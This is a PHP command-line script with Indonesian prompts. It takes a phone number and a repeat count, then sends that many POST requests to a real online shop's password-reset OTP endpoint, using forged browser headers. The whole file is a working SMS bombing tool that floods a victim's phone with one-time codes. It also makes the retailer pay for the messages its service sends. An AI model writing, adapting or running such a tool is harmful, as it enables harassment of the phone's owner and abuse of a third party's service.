<?php
echo "Nomor? ";
$no = trim(fgets(STDIN));
echo "Jumlah? ";
$jumlah = trim(fgets(STDIN));
for ($i=0; $i < $jumlah; $i++) {
  $execute = otp($no);
  if (preg_match('/success/i', $execute)) {
    echo color($color = "green" , "[$i] Success send to $no\n");
  } else {
    echo color($color = "red" , "Failed\n");
    exit();
  }
}
function otp($no){
  $ch = curl_init();

  curl_setopt($ch, CURLOPT_URL, 'https://www.sophieparis.com/iregistration/ajax/sendpasscode');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  curl_setopt($ch, CURLOPT_POSTFIELDS, "mobilephone=$no&resend=true");

  $headers = array();
  $headers[] = ': path: /iregistration/ajax/sendpasscode';
  $headers[] = 'Content-Length: 36';
  $headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
  $headers[] = 'X-Newrelic-Id: VQ8HV15WCBABV1RWDgcGUVM=';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
  $headers[] = 'Origin: https://www.sophieparis.com';
  $headers[] = 'Sec-Fetch-Site: same-origin';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Referer: https://www.sophieparis.com/customer/account/forgotpassword';
  $headers[] = 'Accept-Encoding: gzip, deflate, br';
  $headers[] = 'Accept-Language: en-ID,en-US;q=0.9,en;q=0.8';
  // $headers[] = 'Cookie: ins-gaSSId=599dd8b2-8d9b-a557-f923-0dafec07a54d_1583111730';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);
  return $result;
}

function color($color = "default" , $text) {
  $arrayColor = array(
    'grey' 		=> '1;30',
    'red' 		=> '1;31',
    'green' 	=> '1;32',
    'yellow' 	=> '1;33',
    'blue' 		=> '1;34',
    'purple' 	=> '1;35',
    'nevy' 		=> '1;36',
    'white' 	=> '1;0',
  );
  return "\033[".$arrayColor[$color]."m".$text."\033[0m";
}
?>
